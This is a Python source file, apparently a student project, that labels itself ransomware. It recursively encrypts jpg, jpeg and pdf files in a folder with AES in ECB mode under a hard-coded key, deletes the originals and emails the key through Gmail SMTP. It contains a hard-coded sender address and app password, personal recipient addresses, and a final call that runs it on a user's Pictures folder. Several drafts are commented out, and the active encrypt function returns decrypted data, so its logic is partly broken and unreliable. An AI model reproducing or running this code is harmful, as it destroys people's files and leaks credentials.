import os
import random
import string
from Crypto.Cipher import AES
import smtplib
from email.mime.text import MIMEText
from Crypto.Util.Padding import pad,unpad
'''
def encrypt_file(file_path, key):
    """Encrypt a file using AES in ECB mode with the given key."""
    chunk_size = 64 * 1024 # 64KB
    encrypted_file_path = 'encrypted-' + file_path
    cipher = AES.new(key.encode(), AES.MODE_ECB)
    with open(file_path, 'rb') as infile:
        with open(encrypted_file_path, 'wb') as outfile:
            while True:
                chunk = infile.read(chunk_size)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += b' ' * (16 - (len(chunk) % 16))  # Pad the chunk to be a multiple of 16 bytes
                encrypted_chunk = cipher.encrypt(chunk)
                outfile.write(encrypted_chunk)
    return encrypted_file_path
'''

def generate_random_key(key_length):
    """Generate a random encryption key of the specified length."""
    key = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(key_length))
    return key
'''
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted_data = unpad(cipher.decrypt(data),AES.block_size)
    encrypted_file_path = os.path.join(os.path.dirname(file_path), f"{os.path.basename(file_path)}.jpg")
    with open(encrypted_file_path, 'wb') as f:
        f.write(encrypted_data)
    return encrypted_file_path
'''
'''
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_ECB)
    padded_data = unpad(data, AES.block_size)
    encrypted_data = cipher.encrypt(padded_data)
    encrypted_file_path = os.path.join(os.path.dirname(file_path), f"{os.path.basename(file_path)}.enc")
    with open(encrypted_file_path, 'wb') as f:
        f.write(encrypted_data)
    return encrypted_file_path
from Crypto.Util.Padding import pad, unpad
'''
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()
    cipher = AES.new(key, AES.MODE_ECB)
    encrypted_data = cipher.encrypt(pad(data, AES.block_size))
    encrypted_file_path = os.path.join(os.path.dirname(file_path), f"encrypted-{os.path.basename(file_path)}.jpg")
    with open(encrypted_file_path, 'wb') as f:
        f.write(encrypted_data)
    with open(encrypted_file_path, 'rb') as f:
        encrypted_data = f.read()
    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
    return decrypted_data


def search_and_encrypt_files(folder_path, key):
    """Search for jpeg and pdf files in the specified folder and encrypt them with the given key."""
    for root, dirs, files in os.walk(folder_path):
        for file in files:
            if file.lower().endswith(('.jpeg', '.jpg', '.pdf','.enc')):
                file_path = os.path.join(root, file)
                encrypted_file_path = encrypt_file(file_path, key)
                os.remove(file_path)
                print(f'File {file_path} encrypted as {encrypted_file_path}')

def send_email(email_address, key):
    """Send the encryption key to the specified email address."""
    subject = 'Ransomware Encryption Key'
    body = f'The encryption key for your encrypted files is: {key}'
    from_email = "testcryptonian2023@gmail.com" # Update with your email address
    from_password = 'ggmtxgzgjlatpxna' # Update with your email password
    to_email = "nikolas.anagnost@gmail.com"   #"axileaszervos3@gmail.com"
    msg = MIMEText(body)
    msg['From'] = from_email
    msg['To'] = to_email
    msg['Subject'] = subject
    server = smtplib.SMTP('smtp.gmail.com', 587) # Update with your email provider's SMTP server and port
    server.starttls()
    server.login(from_email, from_password)
    server.sendmail(from_email, to_email, msg.as_string())
    server.quit()

def decrypt_file(encrypted_file_path, key):
    """Decrypt an encrypted file using AES in ECB mode with the given key."""
    with open(encrypted_file_path, 'rb') as infile:
        encrypted_data = infile.read()
    cipher = AES.new(key, AES.MODE_ECB)
    decrypted_data = cipher.decrypt(encrypted_data)
    decrypted_file_path = os.path.join(os.path.dirname(encrypted_file_path), f"decrypted-{os.path.basename(encrypted_file_path)}.jpg")
    with open(decrypted_file_path, 'wb') as outfile:
        outfile.write(decrypted_data)
    return decrypted_file_path

def create_r(folder_path, email_address=""):
    """Main function to run the ransomware."""
    key = b'1BlCZAt5A81VFHC7' # Generate a 16-byte (128-bit) encryption key
    search_and_encrypt_files(folder_path, key)
    if email_address:
        send_email(email_address, key)
        print(f'Encryption key sent to {email_address}')
    print('Ransomware attack complete.')

create_r("C:/Users/nikol/OneDrive - ionio.gr/Pictures","nikolas.anagnost@gmail.com")#"axileaszervos3@gmail.com")
